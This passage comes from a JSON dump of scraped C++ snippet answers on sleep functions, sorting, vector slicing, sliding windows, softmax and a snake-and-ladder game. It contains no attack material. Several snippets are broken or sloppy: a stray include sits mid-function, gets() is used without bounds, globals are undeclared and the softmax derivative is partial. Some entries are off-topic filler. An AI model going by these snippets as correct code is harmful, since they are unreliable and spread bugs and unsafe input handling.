    "description": "#include <chrono> #include <thread>  std::this_thread::sleep_for(std::chrono::milliseconds(x));\n#include <unistd.h>  sleep(10);\n#include <Windows.h>  Sleep(number of milliseconds);\n#include <iostream>     //for using cout #include <Windows.h>     //for using the function Sleep  using namespace std;    //for using cout  int main(void)          {    cout << \"test\" << endl;    Sleep(5000);         //make the programme waiting for 5 seconds    cout << \"test\" << endl;    Sleep(2000);         // wait for 2 seconds before closing     return 0; } \n// to use sleep function on windows with c++ #include <Windows.h> Sleep(3000) // based on milliseconds\n#include <unistd.h> unsigned int sleep(unsigned int seconds);\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3713,
    "keyword": null,
    "link": null,
    "title": " sleep c++ windows",
    "description": "#include <chrono> #include <thread>  std::this_thread::sleep_for(std::chrono::milliseconds(x));\n#include <Windows.h>  Sleep(number of milliseconds);\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3714,
    "keyword": null,
    "link": null,
    "title": " sleep in c++",
    "description": "#include <chrono> #include <thread>  std::this_thread::sleep_for(std::chrono::milliseconds(x));\n#include <unistd.h>  sleep(10);\n#include <Windows.h>  Sleep(number of milliseconds);\n// to use sleep function on windows with c++ #include <Windows.h> Sleep(3000) // based on milliseconds\n#include <unistd.h> unsigned int sleep(unsigned int seconds);\n#if __WIN32 #include <Windows.h> #else #include <unistd.h> #endif\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3715,
    "keyword": null,
    "link": null,
    "title": " sleep in c++ linux",
    "description": "#include <unistd.h>  sleep(10);\n#include <time.h>  int main(int argc, char const *argv[]) {     sleep(10);\t// wait for 10s      return 0; }\n#if __WIN32 #include <Windows.h> #else #include <unistd.h> #endif\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3716,
    "keyword": null,
    "link": null,
    "title": " sleep not declared in this scope c++",
    "description": "Solution: #include <unistd.h>  Include unistd.h header file will solve the error.  Explanation: \"sleep\" function in c++ context, include in header file \"unistd.h\" .  otherwise we can see compilation error like below.  prashad@ubuntu:~/test$ g++ open_videofile.cpp  `pkg-config --cflags --libs opencv` -g  open_videofile.cpp: In function &lsquo;int main(int, char**)&rsquo;: open_videofile.cpp:34:2: error: &lsquo;sleep&rsquo; was not declared in this scope   sleep(5);   ^~~~~   \n\" 's' should be in the form of uppercase in Sleep\"\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3717,
    "keyword": null,
    "link": null,
    "title": " sleep system function linux c++",
    "description": "#include <time.h>  int main(int argc, char const *argv[]) {     sleep(10);\t// wait for 10s      return 0; }\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3718,
    "keyword": null,
    "link": null,
    "title": " slice a vector c++",
    "description": "std::vector<int> v1 = {1, 2, 3};  v2 = std::vector<int>(v1.begin() + 1, v1.end()); // I'm Horrible Hyena \nstd::vector<int> v1 = {1, 2, 3};  v2 = std::vector<int>(v1.begin() + 1, v1.end());\n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3719,
    "keyword": null,
    "link": null,
    "title": " slice std::array cpp",
    "description": "std::copy(arr10.begin(), arr10.begin() + 5, arr5.begin()); \n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3720,
    "keyword": null,
    "link": null,
    "title": " sliding window maximum sum subarray",
    "description": "#include <bits/stdc++.h>  using namespace std;  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"Enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int k;     cout<<\"Enter the size of the sub array\"<<endl;     cin>>k;     int i=0;     int j=0;     int max_sum=0;     int sum=0;     while(j<n)     {         sum=sum+arr[j];         if(j-i+1<k)         {             j++;         }         else if(j-i+1==k)         {             max_sum=max(sum,max_sum);             sum=sum-arr[i];             i++;             j++;         }     }     cout<<max_sum<<endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3721,
    "keyword": null,
    "link": null,
    "title": " sliding window minimum c++",
    "description": "void sliding_window_minimum(std::vector<int> & ARR, int K) {   // pair<int, int> represents the pair (ARR[i], i)   std::deque< std::pair<int, int> > window;   for (int i = 0; i < ARR.size(); i++) {      while (!window.empty() && window.back().first >= ARR[i])        window.pop_back();      window.push_back(std::make_pair(ARR[i], i));       while(window.front().second <= i - K)        window.pop_front();       std::cout << (window.front().first) << ' ';   } } \n",
    "reg_date": "2021-10-12T11:43:23.000Z"
  },
  {
    "id": 3722,
    "keyword": null,
    "link": null,
    "title": " smart pointer c++",
    "description": "void my_func() {     int* valuePtr = new int(15);     int x = 45;     // ...     if (x == 45)         return;   // here we have a memory leak, valuePtr is not deleted     // ...     delete valuePtr; }   int main() { }\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3723,
    "keyword": null,
    "link": null,
    "title": " snake",
    "description": "STOP PLAYING SNAKE AND GET BACK TO WORK\nsnake be like --___----_____(:\nthere is a 99% chance you are not supposed to be here.\n------------------       o               o                o\nStop playing Snake and code\nstop playing snake, go code snake instead!\nbeat my highscore (69420)\nWho else played this in class?\nThis is for inspiration ;)\nYou have better stuff to do.\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3724,
    "keyword": null,
    "link": null,
    "title": " snake and ladder game code in c++ download",
    "description": "//*************************************************************** //                   Source Code //****************************************************************  #include<iostream.h> #include<conio.h> #include<stdlib.h> #include<stdio.h> #include<time.h>  void draw_line(int n, char ch); void board(); void gamescore(char name1[], char name2[], int p1, int p2); void play_dice(int & score);  void main() {     int player1 = 0, player2 = 0, lastposition;     char player1name[80], player2name[80];     clrscr();     randomize();     draw_line(50, '=');     cout << \"\\n\\n\\n\\n\\t\\tSNAKE LADDER GAME\\n\\n\\n\\n\";     draw_line(50, '=');     cout << \"\\n\\n\\nEnter Name of player 1 :\";     gets(player1name);     cout << \"\\n\\n\\Enter Name of player 2 :\";     gets(player2name);     while (player1 <= 100 && player2 <= 100)  \t{         board();         gamescore(player1name, player2name, player1, player2);         cout << \"\\n\\n--->\" << player1name << \" Now your Turn >> Press any key to play \";         getch();         lastposition = player1;         play_dice(player1);         if (player1 < lastposition)             cout << \"\\n\\aOops!! Snake found !! You are at postion \" << player1 << \"\\n\";         else if (player1 > lastposition + 6)             cout << \"\\nGreat!! you got a ladder !! You are at position \" << player1;#         include < iostream.h >             cout << \"\\n\\n--->\" << player2name << \" Now your Turn >> Press any key to play \";         getch();         lastposition = player2;         play_dice(player2);         if (player2 < lastposition)             cout << \"\\n\\n\\aOops!! Snake found !! You are at position \" << player2 << \"\\n\";         else if (player2 > lastposition + 6)             cout << \"\\n\\nGreat!! you got a ladder !! You are at position \" << player2 << \"\\n\";         getch();     }     clrscr();     cout << \"\\n\\n\\n\";     draw_line(50, '+');     cout << \"\\n\\n\\t\\tRESULT\\n\\n\";     draw_line(50, '+');     cout << endl;     gamescore(player1name, player2name, player1, player2);     cout << \"\\n\\n\\n\";     if (player1 >= player2)         cout << player1name << \" !! You are the winner of the game\\n\\n\";     else         cout << player2name << \" !! You are the winner of the game\\n\\n\";     draw_line(50, '+');     getch(); } void draw_line(int n, char ch)  {     for (int i = 0; i < n; i++)         cout << ch; }  void board()  {     clrscr();     cout << \"\\n\\n\";     draw_line(50, '-');     cout << \"\\n\\t\\tSNAKE AT POSITION\\n\";     draw_line(50, '-');     cout << \"\\n\\tFrom 98 to 28 \\n\\tFrom 95 to 24\\n\\tFrom 92 to 51\\n\\tFrom 83 to 19\\n\\tFrom 73 to 1\\n\\tFrom 69 to 33\\n\\tFrom 64 to 36\\n\\tFrom 59 to 17\\n\\tFrom 55 to 7\\n\\tFrom 52 to 11\\n\\tFrom 48 to 9\\n\\tFrom 46 to 5\\n\\tFrom 44 to 22\\n\\n\";     draw_line(50, '-');     cout << \"\\n\\t\\t LADDER AT POSITION\\n\";     draw_line(50, '-');     cout << \"\\n\\tFrom 8 to 26\\n\\tFrom 21 to 82\\n\\tFrom 43 to 77\\n\\tFrom 50 to 91\\n\\tFrom 62 to 96\\n\\tFrom 66 to 87\\n\\tFrom 80 to 100\\n\";     draw_line(50, '-');     cout << endl; }  void gamescore(char name1[], char name2[], int p1, int p2)  {     cout << \"\\n\";     draw_line(50, '~');     cout << \"\\n\\t\\tGAME STATUS\\n\";     draw_line(50, '~');     cout << \"\\n\\t--->\" << name1 << \" is at position \" << p1 << endl;     cout << \"\\t--->\" << name2 << \" is at position \" << p2 << endl;     draw_line(50, '_');     cout << endl; }  void play_dice(int & score)  {     int dice;     dice = random(6) + 1;     cout << \"\\nYou got \" << dice << \" Point !! \";     score = score + dice;     cout << \"Now you are at position \" << score;     switch (score)  \t{     case 98:         score = 28;         break;     case 95:         score = 24;         break;     case 92:         score = 51;         break;     case 83:         score = 19;         break;     case 73:         score = 1;         break;     case 69:         score = 33;         break;     case 64:         score = 36;         break;     case 59:         score = 17;         break;     case 55:         score = 7;         break;     case 52:         score = 11;         break;     case 48:         score = 9;         break;     case 46:         score = 5;         break;     case 44:         score = 22;         break;     case 8:         score = 26;         break;     case 21:         score = 82;         break;     case 43:         score = 77;         break;     case 50:         score = 91;         break;     case 54:         score = 93;         break;     case 62:         score = 96;         break;     case 66:         score = 87;         break;     case 80:         score = 100;     } }  //*************************************************************** // END OF PROJECT //***************************************************************\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3725,
    "keyword": null,
    "link": null,
    "title": " socket programming in cpp",
    "description": "What is socket programming in cpp?\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3726,
    "keyword": null,
    "link": null,
    "title": " softmax c++",
    "description": "// this function calculates the the softmax function. // @param size is the size of the input vector. // @param z is the input vector. // @return buff is the output vector. double* softmax(const int size, double* z) {   double* buff = new double[size];   double sum = 0;   for (int i = 0; i < size; i++)     sum += Exp(z[i]);    for (int i = 0; i < size; i++)     buff[i] = Exp(z[i]) / sum;      return buff; }\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3727,
    "keyword": null,
    "link": null,
    "title": " softmax derivative  c++",
    "description": "// this function calculates the the softmax function. // @param size is the size of the input vector. // @param z is the input vector. // @return buff is the output vector. double* softmax(const int size, double* z) {   double* buff = new double[size];   double sum = 0;   for (int i = 0; i < size; i++)     sum += Exp(z[i]);    for (int i = 0; i < size; i++)     buff[i] = Exp(z[i]) / sum;      return buff; }  // this function calculates the derivative of the softmax function. // @param size is the size of the input vector. // @param z is the input vector. // @return buff is the output vector. double* softmaxDerivative(const int size, double* z) {   double* buff = new double[size];   double* act = softmax(size, z);   for (int i = 0; i < size; i++) {     buff[i] = act[i] * (1. - act[i]);   }   delete[] act;   return buff; }\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3728,
    "keyword": null,
    "link": null,
    "title": " softwareegg.courses4u",
    "description": "cout<<\"bye yesterday\";\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3729,
    "keyword": null,
    "link": null,
    "title": " solution of diamond problem in c++",
    "description": "Virtual inheritance solves the classic &ldquo;Diamond Problem&rdquo;.   It ensures that the child class gets only a single instance of the common base class.\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3730,
    "keyword": null,
    "link": null,
    "title": " solve linear equation system equation functions in c/c++",
    "description": "#include \"stdafx.h\"  int matrixToValues(char matrix[DIM], double result) { \tint i = 0, j = 0, k = 0, l = 0; \tfor (i = 0; matrix[i] != '\\0'; i++) { \t\tif (matrix[i] == ';') { \t\t\tcount++; \t\t} \t} \tfor (i = 0; i < count - 1; i++) { \t\tfor (j = 0; j < count; j++) { \t\t\tchar value[DIM] = \"\";\t  char valueF[DIM] = \"\"; \t\t\tvalues[i][j] = 0; \t\t\tvaluesI[i][j] = 0; \t\t\tl = 0; \t\t\twhile (matrix[k] != '\\0'&&matrix[k] != ';'&&matrix[k] != '\\\\') { \t\t\t\tvalue[l] = matrix[k]; \t\t\t\tk++; l++; \t\t\t} \t\t\tvalue[l] = '\\0'; \t\t\tk++; \t\t\tcalcNow(value, result, 0); \t\t\tif (verified == 1) { \t\t\t\tvalues[i][j] = resultR; \t\t\t\tvaluesS[i][j] = values[i][j]; \t\t\t\tvaluesI[i][j] = resultI; \t\t\t\tvaluesSI[i][j] = valuesI[i][j]; \t\t\t} \t\t\telse { \t\t\t\treturn 0; \t\t\t} \t\t} \t} \treturn 1; }  void solveSystem() { \tint i = 0, j = 0, jC = 0, iC = 0, iS = 0, jS = 0, g = 0, countVal = 0; \tdouble divider = 0, dividerI = 0, valuesToiC[DIM], dividedi[DIM], real = 0, imag = 0; \twhile (i < count - 1) { \t\tvaluesToiC[i] = 100; \t\ti++; \t} \twhile (jC < count - 1 || countVal != 1 && jC != count - 1) { \t\twhile (i < count - 1) { \t\t\tdividedi[i] = 100; \t\t\ti++; \t\t} \t\tj = jC; \t\tfor (i = iC; i < count - 1; i++) { \t\t\tj = jC; \t\t\tif ((values[i][j] != 0 || valuesI[i][j] != 0) && valuesToiC[i] != 200) { \t\t\t\tdivider = values[i][j]; \t\t\t\tdividerI = valuesI[i][j]; \t\t\t\tdividedi[i] = 200; \t\t\t\tfor (j = 0; j < count; j++) { \t\t\t\t\tdivision(values[i][j], valuesI[i][j], divider, dividerI); \t\t\t\t\tvalues[i][j] = resultR; \t\t\t\t\tvaluesI[i][j] = resultI; \t\t\t\t} \t\t\t\tcountVal = 0; \t\t\t\tfor (g = 0; g < count - 1; g++) { \t\t\t\t\tif (values[i][g] != 0 || valuesI[i][g] != 0) { \t\t\t\t\t\tcountVal++; \t\t\t\t\t} \t\t\t\t} \t\t\t} \t\t} \t\tif (countVal != 1) { \t\t\ti = 0; \t\t\twhile (i < count - 1) { \t\t\t\tif (values[i][jC] == 1 && valuesI[i][jC] == 0 && i == jC) { \t\t\t\t\tiC = i; \t\t\t\t\tvaluesToiC[iC] = 200; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t\ti++; \t\t\t} \t\t\tfor (i = (iC + 1) % (count - 1); i < count - 1; i++) { \t\t\t\tif (values[i][jC] != 0 || valuesI[i][jC] != 0) { \t\t\t\t\tfor (j = 0; j < count; j++) { \t\t\t\t\t\tif (valuesToiC[i] != 200 && dividedi[i] == 200 && dividedi[iC] == 200) { \t\t\t\t\t\t\tsubtraction(values[i][j], valuesI[i][j], values[iC][j], valuesI[iC][j]); \t\t\t\t\t\t\tvalues[i][j] = resultR; \t\t\t\t\t\t\tvaluesI[i][j] = resultI; \t\t\t\t\t\t} \t\t\t\t\t} \t\t\t\t} \t\t\t} \t\t\tfor (i = 0; i < count - 1; i++) { \t\t\t\tif (values[i][jC] == 0 && valuesI[i][jC] == 0) { \t\t\t\t\tiC = i; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t} \t\t} \t\tjC++; \t} }  void rearrangeValues() { \tint i = 0, j = 0, weight[DIM]; \tfor (i = 0; i < count - 1; i++) { \t\tfor (j = 0; j < count - 1; j++) { \t\t\tvalInd[i][j] = 0; \t\t} \t} \tfor (i = 0; i < count - 1; i++) { \t\tfor (j = 0; j < count - 1; j++) { \t\t\tif (values[i][j] != 0 || valuesI[i][j] != 0) { \t\t\t\tvalInd[i][j] = j; \t\t\t} \t\t\telse { \t\t\t\tvalInd[i][j] = -1; \t\t\t} \t\t} \t} \tfor (i = 0; i < count - 1; i++) { \t\tweight[i] = 0; \t\tfor (j = 0; j < count - 1; j++) { \t\t\tweight[i] = (int)(weight[i] + valInd[i][j]); \t\t} \t} \tdouble valSave = 0; \tint arrangeOrder[DIM], equa[DIM]; \tfor (i = 0; i < count - 1; i++) { \t\tarrangeOrder[i] = -1; \t\tequa[i] = 1; \t} \tint index = 0; \tint wei = 5000; \tfor (i = 0; i < count - 1; i++) { \t\twei = 5000; \t\tindex = 0; \t\tfor (j = 0; j < count - 1; j++) { \t\t\tif (valInd[j][i] == i && arrangeOrder[i] == -1 && equa[j] == 1) { \t\t\t\tif (wei > weight[j]) { \t\t\t\t\twei = weight[j]; \t\t\t\t\tindex = j; \t\t\t\t} \t\t\t} \t\t} \t\tarrangeOrder[i] = index; \t\tequa[index] = 0; \t} \tfor (i = 0; i < count - 1; i++) { \t\tfor (j = 0; j < count; j++) { \t\t\tvaluesF[i][j] = values[arrangeOrder[i]][j]; \t\t\tvaluesFI[i][j] = valuesI[arrangeOrder[i]][j]; \t\t} \t} \tfor (i = 0; i < count - 1; i++) { \t\tfor (j = 0; j < count; j++) { \t\t\tvalues[i][j] = valuesF[i][j]; \t\t\tvaluesI[i][j] = valuesFI[i][j]; \t\t} \t} }  void getSolutions() { \tint j = 0, i = 0, jS = 0, iS = 0; \tj = count - 1; \ti = count - 2; \tjS = j; \tiS = i; \ti--; \twhile (j - 1 >= 1) { \t\twhile (i >= 0) { \t\t\tresultR = 0; resultI = 0; \t\t\tmultiplication(values[i][j - 1], valuesI[i][j - 1], values[iS][jS], valuesI[iS][jS]); \t\t\tsubtraction(values[i][count - 1], valuesI[i][count - 1], resultR, resultI); \t\t\tvalues[i][count - 1] = resultR; \t\t\tvaluesI[i][count - 1] = resultI; \t\t\tvalues[i][j - 1] = 0; valuesI[i][j - 1] = 0; \t\t\ti--; \t\t} \t\tj--; \t\tiS--; \t\ti = iS - 1; \t} }\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3731,
    "keyword": null,
    "link": null,
    "title": " sony pictures animation films produced",
    "description": "yes very good\n",
    "reg_date": "2021-10-12T11:43:24.000Z"
  },
  {
    "id": 3732,
    "keyword": null,
    "link": null,
    "title": " sort a vector c++",
    "description": "struct data{     string word;     int number; };   bool my_cmp(const data& a, const data& b) {     // smallest comes first     return a.number < b.number; }  std::sort(A.begin(), A.end(), my_cmp);\nstd::sort(myvector.begin(), myvector.end());\nsort(v.begin(), v.end()); \n// C++ program to sort a vector in non-decreasing  // order.  #include <bits/stdc++.h> // Vector  #include <algorithm>  // Sort using namespace std;     int main()  {  // Initalizing the vector v with these values     vector<int> v{ 1, 5, 8, 9, 6, 7, 3, 4, 2, 0 };  // Vector is sorted in ascending order        sort(v.begin(), v.end());         return 0;  } \nsort(begin(v), end(v), [] (int a, int b) { return a > b; }); // decrease\nsort(a.begin(), a.end());\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3733,
    "keyword": null,
    "link": null,
    "title": " sort a vector of strings according to their length c++",
    "description": "std::vector<std::string> v; std::sort(v.begin(), v.end(), []     (const std::string& first, const std::string& second){         return first.size() < second.size();     });\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3734,
    "keyword": null,
    "link": null,
    "title": " sort c++",
    "description": "sort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nsort(arr, arr+n); // sorts in ascending order\n#include<bits/stdc++.h>  vector<int> v = { 6,1,4,5,2,3,0}; sort(v.begin() , v.end()); // {0,1,2,3,4,5,6} sorts ascending sort(v.begin(), v.end(), greater<int>()); // {6,5,4,3,2,1,0} sorts descending\n#include <algorithm>    // std::sort  int myints[] = {32,71,12,45,26,80,53,33}; // using default comparison (operator <): std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33  // fun returns some form of a<b std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)\n// sort algorithm example #include <iostream>     // std::cout #include <algorithm>    // std::sort #include <vector>       // std::vector  bool myfunction (int i,int j) { return (i<j); }  struct myclass {   bool operator() (int i,int j) { return (i<j);} } myobject;  int main () {   int myints[] = {32,71,12,45,26,80,53,33};   std::vector<int> myvector (myints, myints+8);               // 32 71 12 45 26 80 53 33    // using default comparison (operator <):   std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33    // using function as comp   std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)    // using object as comp   std::sort (myvector.begin(), myvector.end(), myobject);     //(12 26 32 33 45 53 71 80)    // print out content:   std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it=myvector.begin(); it!=myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3735,
    "keyword": null,
    "link": null,
    "title": " sort char array c++ using insertion sort",
    "description": "\t// Sort in ascending order \tint j;     char k;     for (int i = 1; i < length; i++)     {         k = arr[i];         j = i - 1;         while (j >= 0 && arr[j] > k)         {             arr[j + 1] = arr[j];             j--;         }         arr[j + 1] = k;     }     std::cout << arr << \"\\n\";\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3736,
    "keyword": null,
    "link": null,
    "title": " sort char array c++ using insertion sort descending order",
    "description": "\t// Sort in ascending order \tint j;     char k;     for (int i = 1; i < length; i++)     {         k = arr[i];         j = i - 1;         while (j >= 0 && arr[j] > k)         {             arr[j + 1] = arr[j];             j--;         }         arr[j + 1] = k;     }     std::cout << arr << \"\\n\";\n\t// Sort in descending order \tint j;     char k;     for (int i = 1; i < length; i++)     {         k = arr[i];         j = i - 1;         while (j >= 0 && arr[j] < k)         {             arr[j + 1] = arr[j];             j--;         }         arr[j + 1] = k;     }     std::cout << arr << \"\\n\";\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3737,
    "keyword": null,
    "link": null,
    "title": " sort in descending order c++",
    "description": "int arr[10]; int length = sizeof(arr)/sizeof(arr[0]);  sort(arr, arr+length, greater<int>());\n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 for (string colour : colours){ 11 cout << colour << ' '; 12 } 13 cout << endl; 14 sort(colours.begin(), colours.end()); 15 for (string colour : colours){ 16 cout << colour << ' '; 17 } 18 return 0; 19 } 66 20 21 /* 22 Output: 23 blue black red green 24 black blue green red 25 */\nsort(arr, arr+n, greater<int>()); // sorts in descending order\n    sort(arr, arr + n, greater<int>());\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3738,
    "keyword": null,
    "link": null,
    "title": " sort in descending order c++ stl",
    "description": "int arr[10]; int length = sizeof(arr)/sizeof(arr[0]);  sort(arr, arr+length, greater<int>());\nsort(arr, arr + n, greater<int>())\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3739,
    "keyword": null,
    "link": null,
    "title": " sort inbuilt function in c++",
    "description": "#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  }\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3740,
    "keyword": null,
    "link": null,
    "title": " sort index c++",
    "description": "vector<int> V(n);    std::iota(V.begin(),V.end(),0); //Initializing    sort( V.begin(),V.end(), [&](int i,int j){return arr[i]<arr[j];} );\n",
    "reg_date": "2021-10-12T11:43:25.000Z"
  },
  {
    "id": 3741,
    "keyword": null,
    "link": null,
    "title": " sort n characters in descending order c++",
    "description": "sort(array, array + n, greater<int>());\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3742,
    "keyword": null,
    "link": null,
    "title": " sort string vector of words alphabetically c++",
    "description": "sort(words_vector.begin(), words_vector.end());\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3743,
    "keyword": null,
    "link": null,
    "title": " sort strings by length and by alphabet",
    "description": "bool comp(string a, string b) { \tif (a.size() != b.size()) return a.size() < b.size(); // primarily by length \treturn a < b;  //secondarily by alphabetical } \n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3744,
    "keyword": null,
    "link": null,
    "title": " sort tuple c++",
    "description": "vector<tuple<int,int,int>> v; v.push_back({2,1,4}); v.push_back({1,5,3}); v.push_back({2,1,3}); sort(v.begin(), v.end()); //the order of the tuples is (1,5,3), (2,1,3) and (2,1,4).\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3745,
    "keyword": null,
    "link": null,
    "title": " sort using comparator anonymous function c++",
    "description": "#include<array> #include<functional>  int main() {     std::array<int, 10> vec = { 1,2,3,4,5,6,7,8,9 };      std::sort(std::begin(vec),                std::end(vec),                [](int a, int b) {return a > b; });      for (auto item : vec)       std::cout << item << \" \";      return 0; } \nsort(mMyClassVector.begin(), mMyClassVector.end(),      [](const MyClass & a, const MyClass & b) -> bool {      return a.mProperty > b.mProperty;  }); \n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3746,
    "keyword": null,
    "link": null,
    "title": " sort using lambda c++",
    "description": "vector<int> v = {50, -10, 20, -30};  sort(v.begin(), v.end());  // the default sort // now v should be { -30, -10, 20, 50 }  // sort by absolute value: sort(v.begin(), v.end(), [](int a, int b) { return abs(a)<abs(b); }); // now v should be { -10, 20, -30, 50 }\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3747,
    "keyword": null,
    "link": null,
    "title": " sort vector c++",
    "description": "#include <iostream> #include <vector> #include <algorithm> using namespace std; int main() {    vector<int> v = { 10, 9, 8, 6, 7, 2, 5, 1 };    sort(v.begin(), v.end(), greater <>()); }\nstruct data{     string word;     int number; };   bool my_cmp(const data& a, const data& b) {     // smallest comes first     return a.number < b.number; }  std::sort(A.begin(), A.end(), my_cmp);\n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nstd::sort(myvector.begin(), myvector.end());\n// C++ program to sort a vector in non-decreasing  // order.  #include <bits/stdc++.h> // Vector  #include <algorithm>  // Sort using namespace std;     int main()  {  // Initalizing the vector v with these values     vector<int> v{ 1, 5, 8, 9, 6, 7, 3, 4, 2, 0 };  // Vector is sorted in ascending order        sort(v.begin(), v.end());         return 0;  } \nsort(begin(v), end(v), [] (int a, int b) { return a > b; }); // decrease\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3748,
    "keyword": null,
    "link": null,
    "title": " sort vector descending",
    "description": "int main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Sort the vector in descending order      sort(a.begin(), a.end(), greater<int>());         // Print the reversed vector      cout << \"Sorted Vector in descendiing order:n\";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         return 0;  } \n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3749,
    "keyword": null,
    "link": null,
    "title": " sort vector in descending order",
    "description": "#include <iostream> #include <vector> #include <algorithm> using namespace std; int main() {    vector<int> v = { 10, 9, 8, 6, 7, 2, 5, 1 };    sort(v.begin(), v.end(), greater <>()); }\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Sort the vector in descending order      sort(a.begin(), a.end(), greater<int>());         // Print the reversed vector      cout << \"Sorted Vector in descendiing order:n\";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         return 0;  } \nsort(a.begin(), a.end(), greater<int>()); \n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3750,
    "keyword": null,
    "link": null,
    "title": " sort vector in descending order c++",
    "description": "#include <iostream> #include <vector> #include <algorithm> using namespace std; int main() {    vector<int> v = { 10, 9, 8, 6, 7, 2, 5, 1 };    sort(v.begin(), v.end(), greater <>()); }\nint arr[10]; int length = sizeof(arr)/sizeof(arr[0]);  sort(arr, arr+length, greater<int>());\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Sort the vector in descending order      sort(a.begin(), a.end(), greater<int>());         // Print the reversed vector      cout << \"Sorted Vector in descendiing order:n\";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         return 0;  } \nstruct data{     string word;     int number; };   bool my_cmp(const data& a, const data& b) {     // smallest comes first     return a.number < b.number; }  std::sort(A.begin(), A.end(), my_cmp);\nsort(a.begin(), a.end(), greater<int>()); \n1325995623\n",
    "reg_date": "2021-10-12T11:43:26.000Z"
  },
  {
    "id": 3751,
    "keyword": null,
    "link": null,
    "title": " sort vector of strings",
